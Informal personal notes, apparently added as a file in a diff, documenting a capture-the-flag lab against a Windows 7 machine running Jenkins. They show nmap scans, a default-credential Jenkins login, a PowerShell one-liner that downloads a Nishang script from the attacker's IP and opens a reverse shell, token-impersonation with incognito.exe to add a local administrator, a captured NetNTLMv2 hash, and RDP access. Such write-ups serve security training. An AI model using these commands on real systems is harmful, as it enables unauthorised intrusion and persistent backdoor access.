@@ -1,0 +1,264 @@
+
+
+Jenkins (admin:admin) // Invoke-PowerShellTct (reverse shell) // incognito (add user/privilage escalation) //  rmdesktop 
+windows 7
+
+Nishang library
+
+https://github.com/samratashok/nishang
+
+
+https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1
+
+I renamed it to invokePowerShellTcp.ps1
+
+
+
+Please note that this machine does not respond to ping (ICMP) and may take a few minutes to boot up.
+
+hmmm, hint maybe,,,, first two nmap show nothing, went with a more intense third ,,,
+
+
+nmap 10.10.139.228 -oN nmap0
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-20 09:08 EST
+Nmap scan report for 10.10.139.228
+Host is up (0.0014s latency).
+All 1000 scanned ports on 10.10.139.228 are filtered
+
+this one I actually have saved as custom alfred!!!
+
+
+nmap -sC -sV -Pn 10.10.139.228 -oN nmap1
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-20 09:09 EST
+Nmap scan report for 10.10.139.228
+Host is up.
+All 1000 scanned ports on 10.10.139.228 are filtered
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 205.56 seconds
+
+-sC = script default
+-sV = service version
+-Pn = no ping 
+
+LOL forgot to openvpn
+
+cat nmap1                                                               1 ⨯
+# Nmap 7.91 scan initiated Sat Feb 20 09:42:38 2021 as: nmap -sC -sV -Pn -oN nmap1 10.10.139.228
+Nmap scan report for 10.10.139.228
+Host is up (0.12s latency).
+Not shown: 997 filtered ports
+PORT     STATE SERVICE    VERSION
+80/tcp   open  http       Microsoft IIS httpd 7.5
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/7.5
+|_http-title: Site doesn't have a title (text/html).
+3389/tcp open  tcpwrapped
+| ssl-cert: Subject: commonName=alfred
+| Not valid before: 2020-10-02T14:42:05
+|_Not valid after:  2021-04-03T14:42:05
+|_ssl-date: 2021-02-20T15:06:15+00:00; -1s from scanner time.
+8080/tcp open  http       Jetty 9.4.z-SNAPSHOT
+| http-robots.txt: 1 disallowed entry 
+|_/
+|_http-server-header: Jetty(9.4.z-SNAPSHOT)
+|_http-title: Site doesn't have a title (text/html;charset=utf-8).
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: -1s
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Sat Feb 20 10:06:16 2021 -- 1 IP address (1 host up) scanned in 1418.79 seconds
+
+
+
+we go to port 80 on browser and just a simple page with picture of bruce wayne an email link  and old html code, 
+
+the -Pn is taking forever,,,,,
+
+i jump to 8080 and login as admin:admin
+
+create a new item and name it shell
+
+we are told to use invoke power shell
+
+powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port
+
+powershell iex (New-Object Net.WebClient).DownloadString('http://10.9.4.45:80/invokePowerShellTcp.ps1');
+Invoke-PowerShellTcp -Reverse -IPAddress 10.9.4.45 -Port 4433
+
+save build
+
+start python server on 80
+
+start nc on 4433
+
+hit build now
+
+nothing,,,, second line of command i think its wrong so we modify,,,
+
+powershell iex (New-Object Net.WebClient).DownloadString('http://10.9.4.45:80/invokePowerShellTcp.ps1');
+Invoke-PowerShellTcp -Reverse -IPAddress 10.9.4.45 -Port 4433
+
+third time,, took space out ,, to make it one line,,,
+
+powershell iex (New-Object Net.WebClient).DownloadString('http://10.9.4.45:80/invokePowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.9.4.45 -Port 4433
+
+
+yeay  ---- the second call is the name of the function not file, first is the name of file
+
+alfred/bruce user 
+
+
+
+
+Privilage Escalation
+
+
+PS C:\Program Files (x86)\Jenkins\workspace\project> whoami
+alfred\bruce
+PS C:\Program Files (x86)\Jenkins\workspace\project> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                  Description                               State   
+=============================== ========================================= ========
+SeIncreaseQuotaPrivilege        Adjust memory quotas for a process        Disabled
+SeSecurityPrivilege             Manage auditing and security log          Disabled
+SeTakeOwnershipPrivilege        Take ownership of files or other objects  Disabled
+SeLoadDriverPrivilege           Load and unload device drivers            Disabled
+SeSystemProfilePrivilege        Profile system performance                Disabled
+SeSystemtimePrivilege           Change the system time                    Disabled
+SeProfileSingleProcessPrivilege Profile single process                    Disabled
+SeIncreaseBasePriorityPrivilege Increase scheduling priority              Disabled
+SeCreatePagefilePrivilege       Create a pagefile                         Disabled
+SeBackupPrivilege               Back up files and directories             Disabled
+SeRestorePrivilege              Restore files and directories             Disabled
+SeShutdownPrivilege             Shut down the system                      Disabled
+SeDebugPrivilege                Debug programs                            Enabled       *****
+SeSystemEnvironmentPrivilege    Modify firmware environment values        Disabled
+SeChangeNotifyPrivilege         Bypass traverse checking                  Enabled 	*****
+SeRemoteShutdownPrivilege       Force shutdown from a remote system       Disabled
+SeUndockPrivilege               Remove computer from docking station      Disabled
+SeManageVolumePrivilege         Perform volume maintenance tasks          Disabled
+SeImpersonatePrivilege          Impersonate a client after authentication Enabled 	*****
+SeCreateGlobalPrivilege         Create global objects                     Enabled 	*****
+SeIncreaseWorkingSetPrivilege   Increase a process working set            Disabled
+SeTimeZonePrivilege             Change the time zone                      Disabled
+SeCreateSymbolicLinkPrivilege   Create symbolic links                     Disabled
+PS C:\Program Files (x86)\Jenkins\workspace\project> 
+
+
+
+
+we will use 
+SeImpersonatePrivilege          Impersonate a client after authentication Enabled 	*****
+
+SeCreateGlobalPrivilege         Create global objects                     Enabled 	*****
+
+
+https://labs.mwrinfosecurity.com/assets/BlogFiles/incognito2.zip
+
+had some issues understanding the smbserver stufff,
+
+navigate inside the incognito2 folder where the incognito.exe file is,,,,
+
+smbserver.py smbfolder . 
+
+
+then from the access powershell we copy / upload file ,,,,
+
+navigate to windows temp directory,,,,
+
+PS C:\windows\temp> copy \\10.9.4.45\smbfolder\incognito.exe
+
+
+Our smbfolder gets hit,,,,
+
+
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed
+[*] Incoming connection (10.10.139.228,49893)
+[*] AUTHENTICATE_MESSAGE (alfred\bruce,ALFRED)
+[*] User ALFRED\bruce authenticated successfully
+[*] bruce::alfred:aaaaaaaaaaaaaaaa:eaace8cc1bdf231b59326215874647f2:010100000000000080261ad1a107d701de5482b89a2f5ad900000000010010005a005a006800790066006f0073006800030010005a005a006800790066006f0073006800020010006c0073005700670074006c0044004b00040010006c0073005700670074006c0044004b000700080080261ad1a107d7010600040002000000080030003000000000000000000000000030000036697d46e66f0b78a0b5c5855ccfc6708ae866aa47440a60af1f97ce35ded9010a0010000000000000000000000000000000000009001c0063006900660073002f00310030002e0039002e0034002e0034003500000000000000000000000000
+[-] Unknown level for query path info! 0x109
+[*] Disconnecting Share(1:SMBFOLDER)
+[*] Closing down connection (10.10.139.228,49893)
+[*] Remaining connections []
+
+
+execute our new installed program  to add user 
+
+PS C:\windows\temp> ./incognito.exe add_user meee
+[-] WARNING: Not running as SYSTEM. Not all tokens will be available.
+[-] Not enough arguments supplied to command
+PS C:\windows\temp> ./incognito.exe add_user meee password
+[-] WARNING: Not running as SYSTEM. Not all tokens will be available.
+[*] Enumerating tokens
+[*] Attempting to add user meee to host 127.0.0.1
+[+] Successfully added user
+
+and then we add user to admin group,,,
+
+PS C:\windows\temp> ./incognito.exe add_localgroup_user Administrators meee
+[-] WARNING: Not running as SYSTEM. Not all tokens will be available.
+[*] Enumerating tokens
+[*] Attempting to add user meee to local group Administrators on host 127.0.0.1
+[+] Successfully added user to local group
+PS C:\windows\temp> 
+
+ohhh my  rdesktop  ,,,, juicy stufff,,,, 
+
+rdesktop -g 90% -u meee -p password 10.10.139.228                      64 ⨯
+Autoselecting keyboard map 'en-us' from locale
+
+ATTENTION! The server uses and invalid security certificate which can not be trusted for
+the following identified reasons(s);
+
+ 1. Certificate issuer is not trusted by this system.
+
+     Issuer: CN=alfred
+
+
+Review the following certificate info before you trust it to be added as an exception.
+If you do not trust the certificate the connection atempt will be aborted:
+
+    Subject: CN=alfred
+     Issuer: CN=alfred
+ Valid From: Fri Oct  2 10:42:05 2020
+         To: Sat Apr  3 10:42:05 2021
+
+  Certificate fingerprints:
+
+       sha1: 6577409f2b1a3e367ca7444957f298c187503a3e
+     sha256: a570120d635e8af9194831b10b5ab9b04619a174a8aa17f11a4de6d0ae370053
+
+
+Do you trust this certificate (yes/no)? yes
+Failed to initialize NLA, do you have correct Kerberos TGT initialized ?
+Core(warning): Certificate received from server is NOT trusted by this system, an exception has been added by the user to trust this specific certificate.
+Connection established using SSL.
+Protocol(warning): process_pdu_logon(), Unhandled login infotype 1
+Clipboard(error): xclip_handle_SelectionNotify(), unable to find a textual target to satisfy RDP clipboard text request
+
+
+gui access, the real question is wtf uses windows 7
+
+
+
+
+
+
+
+
